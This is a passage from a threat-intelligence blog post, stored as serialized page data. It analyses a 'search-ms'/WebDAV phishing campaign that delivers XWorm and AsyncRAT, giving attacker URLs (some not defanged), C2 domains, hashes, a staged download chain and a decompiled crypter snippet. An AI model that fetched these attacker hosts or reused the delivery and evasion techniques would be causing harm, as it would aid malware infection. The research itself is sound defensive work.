attack","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_20":{"__typename":"Paragraph","id":"1d3124020da0_20","name":"49db","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, in this case, the particular attack campaign was already over and so the “invoice6688” file had been deleted. Still, you can observe the query executed in the top right search bar and also the name of the query given as “Search” in the middle top bar and on the very top in the tab name.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_21":{"__typename":"Paragraph","id":"1d3124020da0_21","name":"c074","type":"P","href":null,"layout":null,"metadata":null,"text":"In an attack scenario, there are obviously many file types you could put here to be executed by the victim. From .exe to .lnk, as long as the victim believes the file is on their device and they double-click it, the attack will be successful.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_22":{"__typename":"Paragraph","id":"1d3124020da0_22","name":"7758","type":"P","href":null,"layout":null,"metadata":null,"text":"Initially, I was really intrigued by this new technique. I was planning to write a blog on it and collected some additional information, including a PoC for my local environment. However, I stumbled upon a great medium post by Micah Babinski who thoroughly covered the topic and I just had nothing to add to it. So instead I had a closer look at the IoC given by Trellix and tried to find additional IoC that could be linked to this campaign. I found that some of the servers used in the attacks described by Trellix had actually been used for Microsoft Office Phishing prior to this new campaign. However, all links listed by Trellix were down and I only ended up at dead ends. I decided to stop my investigation and as a last thing I warned my colleagues and industry peers about this new vector, as ever since Microsoft blocked Macro-based documents, attackers are very fast to adapt to new attack vectors. So better be prepared to see this more often.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":212,"end":223,"href":"https:\u002F\u002Fmicahbabinski.medium.com\u002Fsearch-ms-webdav-and-chill-99c5b23ac462","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":227,"end":241,"href":"https:\u002F\u002Ftwitter.com\u002FMicahBabinski","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_23":{"__typename":"Paragraph","id":"1d3124020da0_23","name":"4b5d","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 2: An Unexpected Hit","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_24":{"__typename":"Paragraph","id":"1d3124020da0_24","name":"a7aa","type":"P","href":null,"layout":null,"metadata":null,"text":"One of the key advantages you have, if you are active in the infosec space of social media, is the various contacts you make over time. Besides the fact that you can learn a lot from industry peers if communicating with sufficient people, there are always some interesting things knocking at your door when you least expect them. In the case of this blog post, the day after investigating this new attack vector, I received a message from my friend and industry peer Fate112. Fate had recently observed an increased amount of phishing targeting one of the organizations he is responsible for. As I had noticed some phishing pages on the same servers that were used for the “search-ms” attacks, I had warned him the day before. He actually went on to scan his logs for characteristic patterns of the “search-ms” attack pattern and found a hit! In this case, the execution was prevented by the AV, but it gave me an in-the-wild case to analyze. Awesome! :D","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":467,"end":474,"href":"https:\u002F\u002Ftwitter.com\u002Ftosscoinwitcher","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_25":{"__typename":"Paragraph","id":"1d3124020da0_25","name":"ba3a","type":"P","href":null,"layout":null,"metadata":null,"text":"So, let’s dig into the attack chain:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*GFtbwtoJ3STVtn-smfpLsg.png":{"__typename":"ImageMetadata","id":"1*GFtbwtoJ3STVtn-smfpLsg.png","originalHeight":696,"originalWidth":1063,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_26":{"__typename":"Paragraph","id":"1d3124020da0_26","name":"be61","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*GFtbwtoJ3STVtn-smfpLsg.png"},"text":"Figure 3: Execution Flow ITW attack","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_27":{"__typename":"Paragraph","id":"1d3124020da0_27","name":"0fc5","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, the attack is pretty much the same as we have just learned about. An invoice-themed phishing mail was received by one of the company's employees. A malicious PDF file was attached, showing a typical lure of a “protected document” that contains a link to view the alleged content. The lure can be seen below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*wR3GVrY_2FGEpkQF-5nwag.png":{"__typename":"ImageMetadata","id":"1*wR3GVrY_2FGEpkQF-5nwag.png","originalHeight":1000,"originalWidth":1755,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_28":{"__typename":"Paragraph","id":"1d3124020da0_28","name":"e7ec","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wR3GVrY_2FGEpkQF-5nwag.png"},"text":"Figure 4: Lure Invoice.pdf with link to “search-ms” redirect","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_29":{"__typename":"Paragraph","id":"1d3124020da0_29","name":"fa2b","type":"P","href":null,"layout":null,"metadata":null,"text":"As the filters of the attacked network prevented execution, I was not able to obtain the final payload. However, we will later see what it would likely have been.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_30":{"__typename":"Paragraph","id":"1d3124020da0_30","name":"f913","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 3: Investigating Attackers Infrastructure","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_31":{"__typename":"Paragraph","id":"1d3124020da0_31","name":"8efd","type":"P","href":null,"layout":null,"metadata":null,"text":"After confirming that we had observed an in-the-wild attack using the new “search-ms” attack vector described by Trellix, I was of course curious to see which actor had picked up the method that fast. I was sure it must be a sophisticated actor as you don’t normally see actors adapting so fast. So I started to dig into their infrastructure. A first hint that there was more to find was shared by my fellow researcher RussianPanda:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":419,"end":431,"href":"https:\u002F\u002Ftwitter.com\u002FAnFam17","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"MediaResource:8540f11e8f0d1c5f2315d4419adf79de":{"__typename":"MediaResource","id":"8540f11e8f0d1c5f2315d4419adf79de","iframeSrc":"https:\u002F\u002Fcdn.embedly.com\u002Fwidgets\u002Fmedia.html?type=text%2Fhtml&key=a19fcc184b9711e1b4764040d3dc5c07&schema=twitter&url=https%3A\u002F\u002Ftwitter.com\u002FAnFam17\u002Fstatus\u002F1687723698273595393%3Ft%3DL2YSTX90YIjCL3y9oUSfAg%26s%3D19&image=https%3A\u002F\u002Fi.embed.ly\u002F1\u002Fimage%3Furl%3Dhttps%253A%252F%252Fabs.twimg.com%252Ferrors%252Flogo46x38.png%26key%3Da19fcc184b9711e1b4764040d3dc5c07","iframeHeight":281,"iframeWidth":500,"title":"RussianPanda 🐼 🇺🇦 on Twitter: \"Some connections to XWorm possibly?6f987e223d5e14f3119c0f51b0fdcc4c57a66125dcd7b771fdbf0617e643928b453e461b9405b42e111ea1f280a87155 pic.twitter.com\u002FqTVRelsRtE \u002F Twitter\""},"Paragraph:1d3124020da0_32":{"__typename":"Paragraph","id":"1d3124020da0_32","name":"6eac","type":"IFRAME","href":null,"layout":"INSET_CENTER","metadata":null,"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":{"__typename":"Iframe","mediaResource":{"__ref":"MediaResource:8540f11e8f0d1c5f2315d4419adf79de"}},"mixtapeMetadata":null},"Paragraph:1d3124020da0_33":{"__typename":"Paragraph","id":"1d3124020da0_33","name":"a526","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, there are many further associated paths and files to the WebDav Server used by our attacker. Panda was so kind to share the associated dll’s with me. And indeed, they turned out to be XWorm.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_34":{"__typename":"Paragraph","id":"1d3124020da0_34","name":"7c7a","type":"P","href":null,"layout":null,"metadata":null,"text":"Associated C2s:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_35":{"__typename":"Paragraph","id":"1d3124020da0_35","name":"07cb","type":"ULI","href":null,"layout":null,"metadata":null,"text":"secoundxwormm.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_36":{"__typename":"Paragraph","id":"1d3124020da0_36","name":"b296","type":"ULI","href":null,"layout":null,"metadata":null,"text":"freshinxworm.ddns[.]net","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_37":{"__typename":"Paragraph","id":"1d3124020da0_37","name":"a539","type":"P","href":null,"layout":null,"metadata":null,"text":"The use of dynamic DNS domains for C2 communications is a central technique in the arsenal of the DDGroup actor. We are going to have a thorough look at the network indicators related to this actor in a later part of this blog post.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_38":{"__typename":"Paragraph","id":"1d3124020da0_38","name":"fc12","type":"P","href":null,"layout":null,"metadata":null,"text":"However, I would like to point out another interesting detail:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_39":{"__typename":"Paragraph","id":"1d3124020da0_39","name":"92bf","type":"P","href":null,"layout":null,"metadata":null,"text":"WebDav Environments as used in this attack can actually be queried as well. If you skip the predetermined search term (Invoice-xyz), you actually get all files currently available on the WebDav Server. So when revisiting the server's IP on 09.08.2023, the Invoice files of the before-described attack were already gone. However, there were the following files available:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*yKw4yeOU7oyuQjNrCqAV0A.png":{"__typename":"ImageMetadata","id":"1*yKw4yeOU7oyuQjNrCqAV0A.png","originalHeight":354,"originalWidth":1711,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_40":{"__typename":"Paragraph","id":"1d3124020da0_40","name":"8758","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*yKw4yeOU7oyuQjNrCqAV0A.png"},"text":"Figure 5: Files available (via Explorer.exe)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XumnohGTwVpcvzJUoJfaQQ.png":{"__typename":"ImageMetadata","id":"1*XumnohGTwVpcvzJUoJfaQQ.png","originalHeight":376,"originalWidth":1138,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_41":{"__typename":"Paragraph","id":"1d3124020da0_41","name":"5d85","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XumnohGTwVpcvzJUoJfaQQ.png"},"text":"Figure 6: Files available (via Chrome)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_42":{"__typename":"Paragraph","id":"1d3124020da0_42","name":"197d","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, there was yet another .dll file, which turned out to be AsyncRAT.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_43":{"__typename":"Paragraph","id":"1d3124020da0_43","name":"6285","type":"P","href":null,"layout":null,"metadata":null,"text":"Associated C2 domains:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_44":{"__typename":"Paragraph","id":"1d3124020da0_44","name":"9631","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Darwin090.gleeze[.]com","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_45":{"__typename":"Paragraph","id":"1d3124020da0_45","name":"8e94","type":"ULI","href":null,"layout":null,"metadata":null,"text":"randall010.camdvr[.]org","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_46":{"__typename":"Paragraph","id":"1d3124020da0_46","name":"1947","type":"P","href":null,"layout":null,"metadata":null,"text":"Note: Both camdvr and gleeze are dynamic DNS domains by a DNS provider called Dynu Systems, Inc.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":78,"end":95,"href":"https:\u002F\u002Fdynu.com","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_47":{"__typename":"Paragraph","id":"1d3124020da0_47","name":"bb8a","type":"P","href":null,"layout":null,"metadata":null,"text":"However, what may be even more interesting is the “server.exe” file with the SHA-256 hash: ad91669c04a71d1adedd3800fcfb505734e442a891a532e1ad18c54b05acc98d","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*_i2F0vHumOLH0Kp8QGgB0w.png":{"__typename":"ImageMetadata","id":"1*_i2F0vHumOLH0Kp8QGgB0w.png","originalHeight":962,"originalWidth":1707,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_48":{"__typename":"Paragraph","id":"1d3124020da0_48","name":"77e5","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*_i2F0vHumOLH0Kp8QGgB0w.png"},"text":"Figure 7: server.exe executed in Sandbox","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_49":{"__typename":"Paragraph","id":"1d3124020da0_49","name":"5b40","type":"P","href":null,"layout":null,"metadata":null,"text":"If you enter this hash into the search function of VirusTotal, you will see that this file has previously been submitted as dufs.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_50":{"__typename":"Paragraph","id":"1d3124020da0_50","name":"ac66","type":"P","href":null,"layout":null,"metadata":null,"text":"A little Google investigation later, we can identify the application as an open-source file-sharing server from GitHub: https:\u002F\u002Fgithub.com\u002Fsigoden\u002Fdufs.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":120,"end":151,"href":"https:\u002F\u002Fgithub.com\u002Fsigoden\u002Fdufs","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_51":{"__typename":"Paragraph","id":"1d3124020da0_51","name":"7c24","type":"P","href":null,"layout":null,"metadata":null,"text":"Among the multiple functionalities of this server is the WebDAV protocol. It is therefore very likely we have found the software used for setting up the attacker's WebDAV environment.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_52":{"__typename":"Paragraph","id":"1d3124020da0_52","name":"9e57","type":"P","href":null,"layout":null,"metadata":null,"text":"In addition, when I first stumbled upon the server, there was a digital breadcrumb left which led me to another WebDAV server by this attacker:\nhttp:\u002F\u002F192.155.91[.]72:5000\u002Fdufs.exe.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_53":{"__typename":"Paragraph","id":"1d3124020da0_53","name":"b1ac","type":"P","href":null,"layout":null,"metadata":null,"text":"When looking at that IP in Virustotal, we can yet again make out associated files. They make use of the same “Invoice” related scheme. One of these files is Invoice_RVSJKAM02GH_pdf.lnk with the sha-256 hash: 84d32881ef43a7662841c032d263478fb93c5bac82a126a0d06daf685ad7fa3c.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_54":{"__typename":"Paragraph","id":"1d3124020da0_54","name":"75bb","type":"P","href":null,"layout":null,"metadata":null,"text":"It downloads a file called: http:\u002F\u002F192.155.91.72:5000\u002FInvoice.vbs which in turn downloads a .jpeg file from https:\u002F\u002Fcdn.pixelbin[.]io\u002Fv2\u002Fred-wildflower-1b0af4\u002Foriginal\u002Funiverso_vbs.jpeg . Sadly, the image file was not available anymore. However, the Invoice.vbs file actually hints that it would have contained code to decrypt yet another payload sitting at https:\u002F\u002Fwinyardbuilding[.]nz\u002FB\u002F1vcf.txt. It is assumed that ultimately the final payload would likely have been yet another piece of off-the-shelf malware with dynamic DNS C2. We will have a look at further network indicators in a later chapter. However, before doing so, let's have a look at the previously discovered payloads of XWorm and AsyncRAT.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_55":{"__typename":"Paragraph","id":"1d3124020da0_55","name":"3031","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chapter 4: The Unknown Crypter","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":30,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_56":{"__typename":"Paragraph","id":"1d3124020da0_56","name":"a461","type":"P","href":null,"layout":null,"metadata":null,"text":"When first analyzing the payloads used in the WebDAV attacks described in Chapters 2 and 3, an unknown Crypter was observed. While Payloads like XWorm and AsyncRAT are normally well-known and therefore well covered by common detection tools and online sandboxes, the DLL files in this attack only got a 3\u002F10 rating in the online sandbox service tria.ge with successful executions going as low as 1\u002F10 detection rate as seen in the following analysis: https:\u002F\u002Ftria.ge\u002F230807-zbx56shc85\u002Fbehavioral2","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":451,"end":496,"href":"https:\u002F\u002Ftria.ge\u002F230807-zbx56shc85\u002Fbehavioral2","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_57":{"__typename":"Paragraph","id":"1d3124020da0_57","name":"a242","type":"P","href":null,"layout":null,"metadata":null,"text":"The detection service Intezer did not perform any better and was not able to name\u002Fidentify XWorm as such (although generic malware was successfully detected): https:\u002F\u002Fanalyze.intezer.com\u002Fanalyses\u002Fefa9bcff-0f2a-4805-8761-56b8c7024a1b\u002Fgenetic-analysis","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":159,"end":249,"href":"https:\u002F\u002Fanalyze.intezer.com\u002Fanalyses\u002Fefa9bcff-0f2a-4805-8761-56b8c7024a1b\u002Fgenetic-analysis","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_58":{"__typename":"Paragraph","id":"1d3124020da0_58","name":"7473","type":"P","href":null,"layout":null,"metadata":null,"text":"So I had a closer look at the binaries. The first thing I did was look at the strings extracted by Intezer:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jVeYPerz3zDEsqr3s9SZxA.png":{"__typename":"ImageMetadata","id":"1*jVeYPerz3zDEsqr3s9SZxA.png","originalHeight":734,"originalWidth":2489,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:1d3124020da0_59":{"__typename":"Paragraph","id":"1d3124020da0_59","name":"f2ed","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jVeYPerz3zDEsqr3s9SZxA.png"},"text":"Figure 8: Some of the extracted strings","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_60":{"__typename":"Paragraph","id":"1d3124020da0_60","name":"c257","type":"P","href":null,"layout":null,"metadata":null,"text":"When looking at the extracted strings, two things immediately stick out.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_61":{"__typename":"Paragraph","id":"1d3124020da0_61","name":"b11d","type":"P","href":null,"layout":null,"metadata":null,"text":"First of all, we seem to be dealing with a binary written in the RUST programming language, which is identifiable by the .rs files being imported. It is an interesting choice because RUST has been increasingly used by malware authors to evade Antivirus and Malware Detection solutions due to it being less used for malware creation than older languages like C# or C++. It also makes reversing harder as there are fewer talented reverse engineers for programming languages with lesser use.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_62":{"__typename":"Paragraph","id":"1d3124020da0_62","name":"9a73","type":"P","href":null,"layout":null,"metadata":null,"text":"Additionally, we can see that there is actually a PDB path inside the binary:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_63":{"__typename":"Paragraph","id":"1d3124020da0_63","name":"417b","type":"P","href":null,"layout":null,"metadata":null,"text":"“C:\\Users\\Administrator\\Desktop\\crock\\target\\release\\deps\\crock.pdb”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_64":{"__typename":"Paragraph","id":"1d3124020da0_64","name":"fff2","type":"P","href":null,"layout":null,"metadata":null,"text":"However, as much as I searched for this pdb path, I was not able to find any mention of it. Which is normally not common as the average criminal mostly opts for off-the-shelf encryptors. The only reason that seemed legitimate to me was that I was looking at a previously undocumented crypter, maybe even something self-coded by the actor.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_65":{"__typename":"Paragraph","id":"1d3124020da0_65","name":"1429","type":"P","href":null,"layout":null,"metadata":null,"text":"Of course, this possibility was very intriguing, as it was going in contrary to all prior observations concerning the use of off-the-shelf malware, dynamic DNS C2s, and open-source tools like the Dufs file-sharing server.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_66":{"__typename":"Paragraph","id":"1d3124020da0_66","name":"aa9c","type":"P","href":null,"layout":null,"metadata":null,"text":"At this time, I sent off another Tweet:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"MediaResource:b2168c9585a835e4b1c32b2e9eef1f23":{"__typename":"MediaResource","id":"b2168c9585a835e4b1c32b2e9eef1f23","iframeSrc":"https:\u002F\u002Fcdn.embedly.com\u002Fwidgets\u002Fmedia.html?type=text%2Fhtml&key=a19fcc184b9711e1b4764040d3dc5c07&schema=twitter&url=https%3A\u002F\u002Ftwitter.com\u002FGi7w0rm\u002Fstatus\u002F1688656551454576640%3Fs%3D20&image=https%3A\u002F\u002Fi.embed.ly\u002F1\u002Fimage%3Furl%3Dhttps%253A%252F%252Fabs.twimg.com%252Ferrors%252Flogo46x38.png%26key%3Da19fcc184b9711e1b4764040d3dc5c07","iframeHeight":281,"iframeWidth":500,"title":"Gi7w0rm on Twitter: \"Hey, any of my followers up to some #Rust #reverse engineering? I might have found a new #malware used in attack against at least one governmental entity. If you are up to have a look, please reach out.Need this for my upcoming blogpost. cc: @dr4k0nia@0xd01a@c3rb3ru5d3d53c \u002F Twitter\""},"Paragraph:1d3124020da0_67":{"__typename":"Paragraph","id":"1d3124020da0_67","name":"a8dd","type":"IFRAME","href":null,"layout":"INSET_CENTER","metadata":null,"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":{"__typename":"Iframe","mediaResource":{"__ref":"MediaResource:b2168c9585a835e4b1c32b2e9eef1f23"}},"mixtapeMetadata":null},"Paragraph:1d3124020da0_68":{"__typename":"Paragraph","id":"1d3124020da0_68","name":"2923","type":"P","href":null,"layout":null,"metadata":null,"text":"Sometimes you just have to admit that your capabilities are not sufficient in a certain area and I am definitely not an expert reverse engineer and even less so in the RUST language.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_69":{"__typename":"Paragraph","id":"1d3124020da0_69","name":"2d0a","type":"P","href":null,"layout":null,"metadata":null,"text":"As a response to this tweet, I was contacted by a fellow researcher who goes by the handle cxiao. Cxiao was quick to point out that he was surprised that the online scanning services had done such a poor job in detecting the threat as the obfuscator actually did a straightforward process injection into the default Windows editor “notepad.exe”.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":91,"end":96,"href":"https:\u002F\u002Ftwitter.com\u002Fcxiao__","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_70":{"__typename":"Paragraph","id":"1d3124020da0_70","name":"be03","type":"P","href":null,"layout":null,"metadata":null,"text":"Cxiao was also able to point me toward the likely used crypter\u002Fpacker for this malware. And guess what? It is open source again: https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":129,"end":163,"href":"https:\u002F\u002Fgithub.com\u002Foptiv\u002FFreeze.rs","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_71":{"__typename":"Paragraph","id":"1d3124020da0_71","name":"f09e","type":"P","href":null,"layout":null,"metadata":null,"text":"While we were not able to prove it without doubt, the following technical details make me confident in this assessment:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_72":{"__typename":"Paragraph","id":"1d3124020da0_72","name":"6330","type":"OLI","href":null,"layout":null,"metadata":null,"text":"The targeted process for injection is “notepad.exe”, which in the Freeze.rs code is the default process to be targeted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_73":{"__typename":"Paragraph","id":"1d3124020da0_73","name":"0aac","type":"OLI","href":null,"layout":null,"metadata":null,"text":"The target process is created with the CREATE_SUSPENDED flag (0x4)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_74":{"__typename":"Paragraph","id":"1d3124020da0_74","name":"cfc5","type":"OLI","href":null,"layout":null,"metadata":null,"text":"At the beginning of the main function in the code (virtual address 0x1800011c0 in the sample with Sha-256: afd38445e5249ac5ac66addd18c20d271f41c3ffb056ca49c8c02f9fecb4afcb), there are the following three calls to the Win32 API, which attempt to hide the console window:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_75":{"__typename":"Paragraph","id":"1d3124020da0_75","name":"e1dc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"1800011e6      HWND hWnd = GetConsoleWindow();\n1800011f3      ShowWindow(hWnd, SW_HIDE);\n1800011f8      int32_t lpEnvironment = 3;\n180001220      SetWindowPos(hWnd, -2, 0, 0, 0, 0, 0x3); \u002F\u002F HWND_NOTOPMOST = -2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"java"},"iframe":null,"mixtapeMetadata":null},"Paragraph:1d3124020da0_76":{"__typename":"Paragraph","id":"1d3124020da0_76","name":"af84","type":"P","href":null,"layout":null,"metadata":null,"text":"This exactly matches the code in the hide function in Freeze.rs: 